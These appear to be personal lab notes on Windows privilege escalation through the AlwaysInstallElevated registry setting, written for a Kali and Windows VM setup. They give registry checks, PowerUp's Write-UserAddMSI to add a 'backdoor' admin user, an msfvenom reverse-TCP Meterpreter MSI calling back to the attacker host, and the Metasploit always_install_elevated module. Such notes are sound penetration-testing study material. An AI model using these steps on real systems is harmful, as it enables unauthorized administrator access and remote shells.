# Verification
---
- Verify the value of registries using:
	- `reg query HKLM\Software\Policies\Microsoft\Windows\Installer`
	- `reg query HKCU\Software\Policies\Microsoft\Windows\Installer`
		![[Pasted image 20250417144553.png]]
	- `0x1`means 1, meaning it is **==ON==**

- We can also use `powerup.ps1`(`Invoke-AllChecks`)
	- ![[Pasted image 20250417145031.png]]
# Exploitation
---
- **==Run this after importing and running `PowerUp.ps1`==** -> PowerUp.ps1 will do the job for us 
	- `Write-UserAddMSI`: Created `.msi`file for us
		- ![[Pasted image 20250417145237.png]]
	- Check Existing `administrator`group users:
		- ![[Pasted image 20250417145354.png]]
- Run the generated `msi`file:
	- ![[Pasted image 20250417145435.png]]
- Create **new `backdoor`user**:
	- ![[Pasted image 20250417145613.png]]
- Added `backdoor`user as administrator:
	- ![[Pasted image 20250417145656.png]]


# Another way to exploit
---
1. Open command prompt and type: `msfconsole `
2. In Metasploit (msf > prompt) type: `use multi/handler`  
3. In Metasploit (msf > prompt) type: `set payload windows/meterpreter/reverse_tcp`  
4. In Metasploit (msf > prompt) type: set `lhost [Kali VM IP Address]`  
5. In Metasploit (msf > prompt) type: `run`  
6. Open an **additional command prompt and type**: `msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f msi -o setup.msi`  
7. Copy the generated file, `setup.msi`, to the Windows VM.

# Gaining `NT/Authority` from low level user
---
- We can use: `exploit/windows/local/always_install_elevated`and set a shell to low level user and then run this
	- ![[Pasted image 20250417150715.png]]